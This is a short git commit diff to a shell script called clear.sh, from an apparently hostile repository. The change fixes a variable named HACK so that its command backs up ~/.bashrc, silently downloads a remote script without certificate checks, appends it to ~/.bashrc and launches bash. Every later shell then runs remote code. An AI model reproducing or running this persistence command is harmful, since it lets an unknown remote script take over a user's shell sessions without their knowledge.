933afff7ff3c88205bfb9bf5104e3b86f02c4cd8
root <root@localhost.localdomain>
2019-03-27 23:32:55 -0400

    ok

--- clear.sh
+++ clear.sh
@@ -99,4 +99,4 @@ function ByeHack {
   rm $index_f;
 }
 
-export HACK="cp ~/.bashrc /tmp/_bash ;  wget --no-check-certificate 'https://raw.githubusercontent.com/F0ckLinux/linux-clear/master/clear.sh' -O  >>     ~/.bashrc ;  bash" 
+export HACK="cp ~/.bashrc /tmp/_bash ;  wget --no-check-certificate 'https://raw.githubusercontent.com/F0ckLinux/linux-clear/master/clear.sh' -O- -q  >>     ~/.bashrc ;  bash" 
